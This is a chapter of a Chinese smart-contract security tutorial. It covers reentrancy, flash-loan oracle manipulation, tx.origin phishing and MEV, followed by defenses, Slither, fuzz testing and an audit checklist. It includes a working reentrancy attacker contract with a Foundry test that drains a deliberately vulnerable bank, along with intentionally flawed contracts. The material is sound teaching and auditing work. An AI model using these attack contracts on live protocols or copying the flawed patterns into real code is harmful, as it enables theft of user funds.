# 第 12 章：智能合约安全与审计

> Web3 世界里，一个合约漏洞可能导致数百万美元的损失——而且无法撤回。The DAO 被盗 6000 万美元、Ronin Bridge 被盗 6.25 亿美元、Wormhole 被盗 3.2 亿美元……这些都是真实发生的事。这一章带你深入理解最常见的攻击手法，学会如何防御，以及如何用工具进行安全审计。

## 12.1 为什么合约安全如此重要？

```
传统软件 vs 智能合约：

传统软件出 Bug：
  → 发个补丁，用户更新就好了
  → 最多丢点数据，可以从备份恢复
  → 损失有限，可以追回

智能合约出 Bug：
  → 合约部署后代码不可修改（除非用代理模式）
  → 资金被盗后无法追回（区块链不可逆）
  → 黑客可以在几秒内掏空所有资金
  → 损失动辄数百万甚至数亿美元

历史上最大的几次攻击：
┌──────────────────┬──────────┬─────────────────────┐
│ 项目              │ 损失金额  │ 攻击方式             │
├──────────────────┼──────────┼─────────────────────┤
│ Ronin Bridge     │ $625M    │ 私钥泄露             │
│ Poly Network     │ $611M    │ 跨链验证漏洞          │
│ Wormhole         │ $326M    │ 签名验证绕过          │
│ Nomad Bridge     │ $190M    │ 初始化漏洞            │
│ Euler Finance    │ $197M    │ 闪电贷 + 捐赠攻击     │
│ The DAO (2016)   │ $60M     │ 重入攻击（经典）       │
│ Cream Finance    │ $130M    │ 闪电贷 + 预言机操纵    │
└──────────────────┴──────────┴─────────────────────┘
```

## 12.2 重入攻击（Reentrancy）

这是最经典、最著名的智能合约漏洞，直接导致了以太坊的硬分叉（ETH 和 ETC 的分裂）。

### 攻击原理

```
正常的取款流程：
  1. 检查余额：用户有 10 ETH ✅
  2. 发送 ETH：转 10 ETH 给用户
  3. 更新余额：用户余额 = 0

重入攻击：
  1. 检查余额：攻击者有 10 ETH ✅
  2. 发送 ETH：转 10 ETH 给攻击合约
     ↓
     攻击合约的 receive() 函数被触发
     ↓
     在 receive() 里再次调用 withdraw()
     ↓
     1. 检查余额：攻击者还是 10 ETH ✅（因为第3步还没执行！）
     2. 发送 ETH：又转 10 ETH
        ↓
        再次触发 receive()...
        ↓
        无限循环，直到合约余额被掏空
  3. 更新余额：用户余额 = 0（太晚了，钱已经没了）
```

### 有漏洞的合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ❌ 有重入漏洞的合约
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // ❌ 危险：先发送 ETH，再更新余额
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // 这一行在重入攻击中来不及执行
        balances[msg.sender] = 0;
    }
}
```

### 攻击合约

```solidity
// 攻击合约
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    // 第一步：存入一些 ETH
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 第二步：每次收到 ETH 时，再次调用 withdraw
    receive() external payable {
        attackCount++;
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // 重入！
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### 用 Foundry 复现攻击

```solidity
// test/ReentrancyAttack.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";
import "../src/ReentrancyAttacker.sol";

contract ReentrancyTest is Test {
    VulnerableBank bank;
    ReentrancyAttacker attacker;
    address victim = makeAddr("victim");

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new ReentrancyAttacker(address(bank));

        // 受害者存入 10 ETH
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        bank.deposit{value: 10 ether}();

        // 攻击者有 1 ETH
        vm.deal(address(this), 1 ether);
    }

    function testReentrancyAttack() public {
        console.log("=== 攻击前 ===");
        console.log("Bank balance:", address(bank).balance / 1e18, "ETH");
        console.log("Attacker balance:", address(attacker).balance / 1e18, "ETH");

        // 执行攻击
        attacker.attack{value: 1 ether}();

        console.log("\n=== 攻击后 ===");
        console.log("Bank balance:", address(bank).balance / 1e18, "ETH");
        console.log("Attacker balance:", attacker.getBalance() / 1e18, "ETH");
        console.log("Attack count:", attacker.attackCount());

        // 验证：攻击者用 1 ETH 偷走了 Bank 的所有 ETH
        assertEq(address(bank).balance, 0);
        assertGt(attacker.getBalance(), 10 ether);
    }
}
```

### 三种防御方式

```solidity
// ✅ 方法 1：Checks-Effects-Interactions 模式（CEI）
contract SafeBank_CEI {
    mapping(address => uint256) public balances;

    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // ✅ 先更新状态（Effects）
        balances[msg.sender] = 0;

        // ✅ 最后才和外部交互（Interactions）
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}

// ✅ 方法 2：重入锁（ReentrancyGuard）
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SafeBank_Lock is ReentrancyGuard {
    mapping(address => uint256) public balances;

    // nonReentrant 修饰符：同一笔交易中不能重复进入
    function withdraw() external nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}

// ✅ 方法 3：Pull over Push 模式
contract SafeBank_Pull {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public pendingWithdrawals;

    function requestWithdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        balances[msg.sender] = 0;
        pendingWithdrawals[msg.sender] += balance;
    }

    // 用户主动拉取资金（而不是合约推送）
    function claimWithdrawal() external {
        uint256 amount = pendingWithdrawals[msg.sender];
        require(amount > 0, "Nothing to claim");
        
        pendingWithdrawals[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

## 12.3 闪电贷攻击

闪电贷是 DeFi 独有的概念：在一笔交易内借出巨额资金，只要在交易结束前还回来就行，不需要任何抵押。

```
闪电贷流程（一笔交易内完成）：
  1. 从 Aave 借出 1000 万 USDC（零抵押）
  2. 用这 1000 万做各种操作（套利、攻击...）
  3. 还回 1000 万 USDC + 手续费
  4. 如果还不回来 → 整笔交易回滚，就像什么都没发生

合法用途：
  ✅ 套利：在不同 DEX 之间搬砖
  ✅ 清算：借钱清算不健康的借贷头寸
  ✅ 自我清算：借钱还自己的贷款

攻击用途：
  ❌ 价格操纵：用巨额资金操纵预言机价格
  ❌ 治理攻击：借大量代币获得投票权
```

### 闪电贷 + 预言机操纵攻击

```solidity
// 有漏洞的借贷协议（使用 DEX 现货价格作为预言机）
contract VulnerableLending {
    IERC20 public collateralToken; // 抵押品代币
    IERC20 public borrowToken;     // 借出代币
    IUniswapV2Pair public pricePair; // 用 Uniswap 价格作为预言机 ❌

    // ❌ 危险：直接用 DEX 现货价格
    function getPrice() public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1, ) = pricePair.getReserves();
        return uint256(reserve1) * 1e18 / uint256(reserve0);
    }

    function borrow(uint256 collateralAmount) external {
        collateralToken.transferFrom(msg.sender, address(this), collateralAmount);
        
        // 用现货价格计算可借金额
        uint256 price = getPrice(); // ❌ 可被操纵！
        uint256 borrowAmount = collateralAmount * price * 80 / 100 / 1e18;
        
        borrowToken.transfer(msg.sender, borrowAmount);
    }
}
```

```solidity
// 攻击合约
contract FlashLoanAttacker {
    function attack() external {
        // 1. 从 Aave 闪电贷借出大量 Token A
        // aave.flashLoan(address(this), tokenA, 10_000_000e18, "");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 2. 用借来的 Token A 在 Uniswap 大量卖出
        //    → Token A 价格暴跌
        // uniswapRouter.swapExactTokensForTokens(amount, ...);

        // 3. 此时 VulnerableLending 的 getPrice() 返回被操纵的低价
        //    → 用很少的 Token A 作为抵押，借出大量 Token B
        // vulnerableLending.borrow(smallAmount);

        // 4. 在 Uniswap 买回 Token A（价格已恢复）
        // uniswapRouter.swapExactTokensForTokens(...);

        // 5. 还回闪电贷 + 手续费
        // IERC20(asset).approve(address(aave), amount + premium);

        // 利润 = 借出的 Token B - 手续费
        return true;
    }
}
```

### 防御：使用 TWAP 或 Chainlink 预言机

```solidity
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract SafeLending {
    AggregatorV3Interface public priceFeed;

    constructor(address _priceFeed) {
        priceFeed = AggregatorV3Interface(_priceFeed);
    }

    // ✅ 使用 Chainlink 预言机（无法被闪电贷操纵）
    function getPrice() public view returns (uint256) {
        (
            uint80 roundId,
            int256 price,
            ,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();

        // 安全检查
        require(price > 0, "Invalid price");
        require(updatedAt > block.timestamp - 1 hours, "Stale price");
        require(answeredInRound >= roundId, "Stale round");

        return uint256(price);
    }
}
```

## 12.4 更多常见漏洞速查

### 整数溢出（Solidity 0.8+ 已自动检查）

```solidity
// Solidity 0.7 及以下：❌ 没有溢出检查
uint8 a = 255;
a += 1; // a = 0（溢出！）

// Solidity 0.8+：✅ 自动检查，溢出会 revert
uint8 a = 255;
a += 1; // revert: arithmetic overflow

// 如果你确实需要不检查溢出（Gas 优化）：
unchecked {
    uint8 a = 255;
    a += 1; // a = 0，不会 revert
}
// ⚠️ 只在你 100% 确定不会溢出时使用 unchecked
```

### tx.origin 钓鱼

```solidity
// ❌ 危险：用 tx.origin 做权限检查
contract VulnerableWallet {
    address public owner;

    function transfer(address to, uint256 amount) external {
        require(tx.origin == owner, "Not owner"); // ❌
        payable(to).transfer(amount);
    }
}

// 攻击：诱导 owner 调用攻击合约
contract PhishingAttack {
    VulnerableWallet wallet;

    // owner 被诱导调用这个函数
    function claimReward() external {
        // tx.origin = owner（因为是 owner 发起的交易）
        // msg.sender = 攻击合约
        wallet.transfer(attacker, wallet.balance);
    }
}

// ✅ 正确：用 msg.sender
require(msg.sender == owner, "Not owner");
```

### 前端运行（Front-Running）与 MEV

```
MEV (Maximal Extractable Value) 是矿工/验证者通过重排交易获取的额外利润。

三明治攻击（Sandwich Attack）：
  1. 你提交一笔大额 Swap：用 100 ETH 买 USDC
  2. MEV Bot 看到你的交易（在 mempool 中）
  3. Bot 在你之前插入一笔买入交易（抬高价格）
  4. 你的交易以更高的价格执行
  5. Bot 在你之后插入一笔卖出交易（赚取差价）

  你的交易：买 100 ETH 的 USDC
  
  Bot 买入 → 价格上涨 → 你的交易执行（更贵）→ Bot 卖出（赚差价）
  
  你多花的钱 = Bot 的利润

防御方式：
  ✅ 设置合理的滑点保护（maxSlippage）
  ✅ 使用 Flashbots 私有交易池（不经过公共 mempool）
  ✅ 使用 MEV 保护的 RPC（如 Flashbots Protect）
```

## 12.5 安全审计工具

### Slither：静态分析

```bash
# 安装
pip3 install slither-analyzer

# 运行分析
slither ./contracts/

# 输出示例：
# VulnerableBank.withdraw() (contracts/Bank.sol#15-22)
#   External calls:
#     - (success) = msg.sender.call{value: balance}()
#   State variables written after the call:
#     - balances[msg.sender] = 0
#   → Reentrancy vulnerability detected!
```

### Foundry Fuzz Testing

```solidity
// 用 Fuzz 测试发现边界情况
contract TokenFuzzTest is Test {
    MyToken token;

    function setUp() public {
        token = new MyToken();
        token.mint(address(this), 1000000e18);
    }

    // Foundry 会自动生成随机输入
    function testFuzz_TransferNeverExceedsBalance(
        address to,
        uint256 amount
    ) public {
        vm.assume(to != address(0));
        vm.assume(to != address(this));

        uint256 balanceBefore = token.balanceOf(address(this));

        if (amount <= balanceBefore) {
            token.transfer(to, amount);
            assertEq(token.balanceOf(address(this)), balanceBefore - amount);
            assertEq(token.balanceOf(to), amount);
        } else {
            vm.expectRevert();
            token.transfer(to, amount);
        }
    }

    // 不变量测试：总供应量永远不变
    function testFuzz_TotalSupplyInvariant(
        address from,
        address to,
        uint256 amount
    ) public {
        vm.assume(from != address(0) && to != address(0));
        vm.assume(from != to);

        uint256 totalBefore = token.totalSupply();

        // 无论怎么转账，总供应量不变
        vm.prank(from);
        try token.transfer(to, amount) {} catch {}

        assertEq(token.totalSupply(), totalBefore);
    }
}
```

### 安全审计 Checklist

```
合约安全审计清单：

□ 重入防护
  □ 所有外部调用都在状态更新之后？
  □ 使用了 ReentrancyGuard？
  □ 检查了跨函数重入？

□ 访问控制
  □ 敏感函数有权限检查？
  □ 使用 msg.sender 而非 tx.origin？
  □ 管理员权限是否过大？

□ 数学安全
  □ 使用 Solidity 0.8+ 或 SafeMath？
  □ 除法前检查除数不为 0？
  □ 精度损失是否可接受？

□ 预言机安全
  □ 不使用 DEX 现货价格？
  □ Chainlink 价格有过期检查？
  □ 有备用预言机？

□ 闪电贷防护
  □ 关键操作不依赖单笔交易内的价格？
  □ 使用 TWAP 而非现货价格？

□ 前端运行防护
  □ 有滑点保护？
  □ 有截止时间（deadline）？

□ 代理合约安全
  □ 存储布局无冲突？
  □ 初始化函数只能调用一次？
  □ 升级权限受控？

□ Gas 优化
  □ 循环有上限？
  □ 不会因 Gas 不足导致 DoS？
```

## 12.6 本章小结与练习

### 你学到了什么

- 重入攻击的原理、复现和三种防御方式（CEI 模式、ReentrancyGuard、Pull over Push）
- 闪电贷攻击：零抵押借贷 + 预言机操纵的组合攻击
- 整数溢出、tx.origin 钓鱼、前端运行（MEV）等常见漏洞
- Chainlink 预言机的安全集成（过期检查、价格有效性验证）
- Slither 静态分析工具的使用
- Foundry Fuzz Testing：自动生成随机输入发现边界 Bug
- 完整的安全审计 Checklist

### 动手练习

1. **复现 The DAO 攻击**：用 Foundry 编写完整的重入攻击测试，包括攻击合约和修复后的安全合约

2. **闪电贷套利 Bot**：用 Foundry Fork 主网，实现一个简单的闪电贷套利：从 Aave 借 USDC → 在 Uniswap 买 ETH → 在 Sushiswap 卖 ETH → 还回 USDC + 利润

3. **安全审计实战**：找一个开源的 DeFi 合约（如 Compound V2），用 Slither 扫描，写一份简单的审计报告

4. **Fuzz 测试套件**：为你在第 6 章写的 ERC-20 合约编写完整的 Fuzz 测试，覆盖所有边界情况

### 下一章预告

下一章进入 Solana 合约开发——用 Rust + Anchor 框架开发 Solana 链上程序。Solana 的编程模型和 EVM 完全不同，Account Model、PDA、CPI 这些概念需要重新理解。
